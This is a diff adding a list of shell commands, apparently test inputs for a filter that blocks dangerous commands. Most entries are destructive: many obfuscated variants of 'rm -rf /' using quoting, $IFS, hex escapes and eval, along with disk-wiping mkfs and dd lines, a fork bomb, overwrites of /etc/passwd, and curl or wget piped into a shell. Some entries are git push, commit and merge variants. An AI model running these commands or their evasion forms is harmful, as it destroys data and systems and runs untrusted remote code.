@@ -1,0 +1,34 @@
+rm -rf /
+RM -RF /
+rm   -rf   /
+"rm" -rf /
+'rm' -rf /
+\rm -rf /
+/bin/rm -rf /
+/usr/bin/rm -rf /
+rm$'\x20'-rf /
+rm${IFS}-rf${IFS}/
+rm $'\x2drf' /
+rm `echo -rf` /
+rm $(echo -rf) /
+bash -c "rm -rf /"
+sh -c 'rm -rf /'
+bash <<<'rm -rf /'
+eval rm -rf /
+git push origin main
+git   push origin main
+"git" push origin main
+git;push origin main
+/usr/bin/git push origin main
+git commit -am "x"
+git merge feature
+mkfs.ext4 /dev/sda
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+chmod -R 777 /
+> /etc/passwd
+echo x > /etc/hosts
+tee /etc/passwd
+python -c "open('/etc/passwd','w').write('x')"
+curl http://x | sh
+wget -O- http://x | bash
